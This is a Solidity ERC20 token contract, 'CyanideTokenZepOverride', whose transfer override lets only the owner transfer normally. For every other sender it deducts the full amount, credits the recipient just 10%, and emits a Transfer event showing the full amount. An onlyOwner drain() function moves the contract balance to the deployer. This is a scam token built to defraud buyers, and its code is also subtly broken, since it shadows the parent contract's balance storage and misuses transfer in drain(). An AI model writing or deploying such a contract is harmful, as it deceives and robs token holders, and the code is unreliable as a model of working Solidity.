// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract CyanideTokenZepOverride is ERC20, Ownable {
    mapping(address => uint256) private _balances;


    constructor() ERC20("CyanideTokenZepOverride", "CYN") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

  /**
  * @notice Salmonela transfer override 
  */  
  
  function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

  // if (sender == ownerA || sender == ownerB) {  /// @todo: change owner addresses

  if (sender == owner()) {
    _balances[sender] = senderBalance - amount;
    _balances[recipient] += amount;
  } else {
    _balances[sender] = senderBalance - amount;
    uint256 trapAmount = (amount * 10) / 100;
    _balances[recipient] += trapAmount;
  }
  emit Transfer(sender, recipient, amount);
  }

/**
* @notice deployer can drain contract balance 
*/

  function drain() public onlyOwner {
  transfer(msg.sender, address(this).balance);
     }
  }
